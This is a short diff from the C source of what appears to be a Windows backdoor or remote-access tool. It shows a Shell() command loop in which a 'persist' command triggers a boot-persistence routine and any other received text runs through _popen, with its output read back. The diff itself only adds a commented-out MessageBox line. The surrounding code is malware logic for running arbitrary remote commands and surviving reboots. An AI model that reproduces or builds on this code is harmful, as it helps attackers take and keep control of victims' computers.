@@ -101,6 +101,7 @@ void Shell() {
 		} else if (strncmp("persist", buffer, 7) == 0) {
 			bootRun();
 		} else {
+			// MessageBox(NULL, TEXT(buffer), TEXT("Chat"), MB_ICONWARNING | MB_YESNO);
 			FILE *fp;
 			fp = _popen(buffer, "r");
 			while(fgets(container, 1024, fp) != NULL) {
